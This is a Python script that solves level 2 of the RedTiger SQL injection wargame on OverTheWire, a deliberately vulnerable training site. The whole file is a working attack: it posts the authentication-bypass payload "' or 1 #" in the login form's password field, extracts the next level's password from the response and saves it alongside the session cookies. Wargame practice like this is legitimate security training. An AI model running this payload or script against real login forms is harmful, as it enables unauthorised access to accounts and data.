#!/usr/bin/env python3
import tigers as tg
import tiger_cookies


def main():
    """
    Simple sqli injection

    Target: Login
    Hint: Condition
    """
    url = "https://redtiger.labs.overthewire.org/level2.php"
    pass_r = 'The password for the next level is: '
    level = 'level2login'
    method = 'post'
    inj_param = 'password'
    other_param = {'username': '1', 'login': 'Login'}

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level2login=cooks[level])

    # Injection
    payload = "' or 1 #"
    p = tg.SqlInjection(url, cook, method, inj_param, payload,
                        check_clear=pass_r, other_param=other_param)
    response = p.my_request()

    # Еxtracting data from html
    passw = p.extract_pass(response)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
